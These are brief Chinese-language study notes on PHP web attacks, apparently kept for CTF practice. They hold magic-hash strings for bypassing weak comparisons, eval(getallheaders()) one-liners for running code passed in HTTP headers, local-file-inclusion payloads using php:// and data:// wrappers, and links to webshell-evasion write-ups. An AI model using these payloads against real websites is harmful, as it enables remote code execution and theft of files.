# PHP积累

## PHP 三种写法

```
<? echo ("这是一个 PHP 语言的嵌入范例\n"); ?>
<?php echo("这是第二个 PHP 语言的嵌入范例\n"); ?>
<script language="php"> 
echo ("这是类似 JavaScript 及 VBScript 语法
的 PHP 语言嵌入范例");
</script>
<% echo ("这是类似 ASP 嵌入语法的 PHP 范例"); %>
```

## PHP中的弱类型比较

以下值在MD5加密以0E开头：

```
QNKCDZO
240610708
S878926199a
s155964671a
s214587387a
```

以下值在sha1加密之后以0E开头：

```
sha1('aaroZmOk')
sha1('aaK1STfy')
sha1('aaO8zKZF')
sha1('aa3OFF9m')
```

## parse_url 绕过

- path部分以``///``开头返回``bool(false)``


#### 参考资料

浅析无参数rce

https://www.cnblogs.com/wangtanzhi/p/12311239.html

### 一些有用的函数和调用

- ``get_defined_vars()``
  
    获取文件中全部变量，包括include

- ``eval(end(getallheaders()))``
  
    利用``HTTP``最后的一个``header``传参

- ``eval(getallheaders(){'a'})``

    利用``HTTP``名为``a``的``header``传参
- ``error_reporting(E_ALL);``
    开启报错
- ``getcwd()``
    获得当前路径

### 参考资料

一些不包含数字和字母的webshell：

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

PHP回调后门：

https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html

php webshell检测与绕过

https://www.smi1e.top/php-webshell%e6%a3%80%e6%b5%8b%e4%b8%8e%e7%bb%95%e8%bf%87/

## LFI

### Wrapper

```
php://filter/convert.base64-encode/resource=index.php
```
### include

- ``php://input`` + POST报文php代码  (allow_url_include=On)

- ``data://text/plain,<phpcode>`` (allow_url_include=On)

- php7 ``php://filter/string.strip_tags=/etc/passwd`` 
  
  导致php在执行过程中出现segment fault错误，这样如果再此同时上传文件那么临时文件就会被保存在/tmp目录下，不会被删除。
  文件名需要爆破``/tmp/phpxxxxx``

- session + lfi getshell

### 参考资料

https://xz.aliyun.com/t/5535#toc-7

php文件包含漏洞： https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/


## rand() 安全性问题 

php_mt_seed